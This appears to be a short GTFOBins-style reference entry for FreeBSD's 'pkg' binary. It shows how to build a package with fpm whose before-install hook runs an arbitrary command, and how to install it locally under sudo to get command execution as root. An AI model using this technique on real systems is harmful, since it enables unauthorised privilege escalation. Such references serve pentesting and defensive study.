---
type: gtfobin
name: pkg
platform: Unix
functions: [command]
tags: [gtfobin, unix, lotl]
---

# pkg

## command

```bash
pkg install -y --no-repo-update ./x-1.0.txz
```
_Generate the FreeBSD package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.

```
echo /path/to/command >x.sh
fpm -n x -s dir -t freebsd -a all --before-install x.sh .
```_
**Contexts:** sudo
